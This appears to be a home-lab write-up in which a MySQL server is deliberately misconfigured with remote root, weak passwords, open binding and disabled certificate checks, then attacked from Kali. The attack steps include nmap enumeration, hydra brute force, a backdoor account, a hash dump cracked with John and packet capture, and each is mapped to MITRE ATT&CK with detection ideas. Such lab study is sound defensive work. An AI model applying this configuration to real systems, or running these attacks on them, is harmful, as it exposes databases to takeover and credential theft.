**Vulnerable MySQL configuration:**

```bash
# Create root user that can authenticate from ANY host
# Uses a weak, predictable password

CREATE USER IF NOT EXISTS 'root'@'%' IDENTIFIED BY 'MySQL123!';

# Grant ALL privileges on ALL databases

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;

# Service account accessible from ANY host
# Uses a weak, predictable password 

CREATE USER IF NOT EXISTS 'svc-sql'@'%' IDENTIFIED BY 'SqlPassword123!';

# Identical privileges as root

GRANT ALL PRIVILEGES ON *.* TO 'svc-sql'@'%' WITH GRANT OPTION;

FLUSH PRIVILEGES;

notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini"

# Binds MySQL to ALL network interfaces
# Database accessible from NAT network, not just localhost

bind-address = 0.0.0.0

net stop MySQL80
net start MySQL80
```

**Test on KALI:**

```bash
# 1. Root 

mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0

# 2. svc-sql

mysql -h 192.168.56.4 -u svc-sql -pSqlPassword123! --ssl-verify-server-cert=0
```

**Direct from APP01:**

```powershell
"C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -pMySQL123!
```
## **MITRE ATT&CK Mapping**

- **T1078.001** - Valid Accounts: Default Accounts
- **T1078.003** - Valid Accounts: Local Accounts (service account abuse)
- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1210** - Exploitation of Remote Services (exposed database)
- **T1557** - Man-in-the-Middle (no SSL verification)

## **Detection Opportunities**

These misconfigurations create detectable events:

- Remote MySQL authentication from non-web-server IPs
- Multiple failed authentication attempts (credential stuffing)
- Unusual `GRANT` operations (privilege escalation)
- Database connections from unexpected subnets
- Large data exfiltration (SELECT queries with high row counts)


---

### Root accessible remotely
**MITRE ATT&CK:** T1078.001 (Valid Accounts: Default Accounts)

**Verify on APP01:**

![APP01-Remote-Access-1](assets/APP01-Remote-Access-1.png)

**KALI root access:**
![APP01-Remote-Access-2](assets/APP01-Remote-Access-2.png)

**KALI creates backdoor:**

```bash
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; 
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
```

![APP01-Backdoor-1](assets/APP01-Backdoor-1.png)


---

### Service account with root privileges
**MITRE ATT&CK:** T1078.003 (Valid Accounts: Local Accounts), T1552.001 (Credentials in Files)

```bash
SHOW GRANTS FOR 'svc-sql'@'%' \G
```

![APP01-Service-Root-1](assets/APP01-Service-Root-1.png)

**KALI logs in directly as service account:**

![APP01-Service-Root-2](assets/APP01-Service-Root-2.png)

---

### MySQL bound to ALL network interfaces
**MITRE ATT&CK:** T1210 (Exploitation of Remote Services)

```powershell
# View the vulnerable configuration

notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini"
```

![APP01-All-Network](assets/APP01-All-Network.png)

```powershell
# Verify the listening port

netstat -ano | Select-String "3306"
```

![APP01-All-Network-2](assets/APP01-All-Network-2.png)

**Probe port 3306 from KALI to get specific MySQL details:**

```bash
# Network sweep for MySQL services 
nmap -p 3306 192.168.56.0/24 --open 

# Service version detection 
nmap -p 3306 -sV 192.168.56.4
```

![APP01-All-Network-3](assets/APP01-All-Network-3.png)

```bash
# MySQL-specific enumeration 

nmap -p 3306 --script=mysql-info,mysql-enum 192.168.56.4
```

![APP01-All-Network-4](assets/APP01-All-Network-4.png)


---
### Weak password
**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing), T1110.002 (Brute Force: Password Cracking)


**Credential brute force:**

```bash
# Attack from KALI
# Use hydra with a pre-determined wordlist for MySQL

cd /usr/share/wordlists/
hydra -l root -P mysql.txt mysql://192.168.56.4 -t 4 -V
```

![APP01-Hydra](assets/APP01-Hydra.png)

**KALI cracks the hash offline**:

```bash
# After gaining access, view stored password hashes

SELECT user, host, authentication_string 
FROM mysql.user;
```

![APP01-Offline-1](assets/APP01-Offline-1.png)

- The two `root` user hashes are: `*6EC9DAC5D899D7F91D65025352A68A7FB70132E8`
- The hash starts with an asterisk (`*`) and is **41 characters long** (including the `*`).
- This format is known as the **MySQL 4.1+/MySQL Native Password** format, which is an SHA-1 hash of an SHA-1 hash of the password `SHA1(SHA1(password))`.
- This hash type corresponds to **Hashcat Mode 300** or **John the Ripper's `mysql-sha1` format**.

```bash
# Extract hash files to KALI

mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0 -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user WHERE authentication_string != ''" | tail -n +2 | awk '{print $1}' > mysql_hashes.txt

# Crack with John the Ripper
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/mysql.txt mysql_hashes.txt
```

![APP01-Offline-2](assets/APP01-Offline-2.png)
 

---

### SSL certificate verification disabled
**MITRE ATT&CK:** T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing)

```bash
# Verify on APP01

SHOW VARIABLES LIKE 'require_secure_transport';
```

![APP01-SSL-Disabled-1](assets/APP01-SSL-Disabled-1.png)

**Client-side connection with disabled verification:**

```bash
mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0
```

![APP01-SSL-Disabled-3](assets/APP01-SSL-Disabled-3.png)

**Secure connection attempt (without flag) reveals certificate issues:**

```bash
mysql -h 192.168.56.4 -u root -pMySQL123!
```

![APP01-SSL-Disabled-2](assets/APP01-SSL-Disabled-2.png)

**tcpdump packet capture:**

```bash
tcpdump -i eth1 -w mysql_capture.pcap 'port 3306'
```

![APP01-TCP-1](assets/APP01-TCP-1.png)

**Open pcap file in Wireshark:**


![APP01-TCP-2](assets/APP01-TCP-2.png)